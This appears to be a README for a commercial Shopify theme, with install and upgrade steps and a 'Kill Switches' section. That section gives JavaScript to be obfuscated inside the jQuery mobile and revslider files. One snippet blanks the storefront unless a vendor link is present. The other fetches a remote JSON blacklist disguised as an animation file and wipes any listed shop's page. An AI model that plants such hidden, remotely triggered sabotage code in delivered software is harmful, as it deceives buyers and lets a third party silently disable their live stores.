# How To Install
Collection of Digital Brandz Sections

Watch this video
https://www.screencast.com/t/GHOBoFeOu9a

# New Slider Method

As of January 20th 2020 this is the new method to adding an Animated Slider to This Theme
https://www.youtube.com/watch?v=vPK0LzFAM_s

# Advanced Collections Method

As of January 20th 2020 this is the advanced collections method you can use for specially designed collection fonts
https://www.youtube.com/watch?v=GYRGYBSHFzM

# How To Upgrade Existing Theme
1. Upload theme
2. copy settings.data from previous theme to new theme
3. copy contents of snippet slider-home.liquid from previous theme to new theme
3. copy contents of setup.js in assets folder...  from previous theme to new theme

#Kill Switches (for protection)

this code scrambled and placed in the jquery mobile base file at line 1732 will remove the body
```
  if(!find_link_by_href("http://digitalbrandz.com")) {
    document.body.innerHTML = "";
  }
  function find_link_by_href(address) {
   links = document.getElementsByTagName("a");

    for(var i = 0; i < links.length; i++) { 
      if( links[i].href.includes(address) ) {
        return true; 
     } 
 
    }
  }
  ```
  This code placed in the revslider js file...actually calls to github and checks the blacklist 
  
  ```
fetch('https://cdn.jsdelivr.net/gh/digitalbrandz/animations/animate.json')
    .then(res => res.json())
    .then((out) => {
         var shopname = window.Shopify.shop.replace('.myshopify.com','');
     if(out.websites.includes(shopname)) {
       document.body.innerHTML = "";
     };
}).catch(err => console.error(err));  
  ```
  
  then you can [Purge Cache](https://purge.jsdelivr.net/gh/digitalbrandz/animations/animate.json) anytime you add a new entry

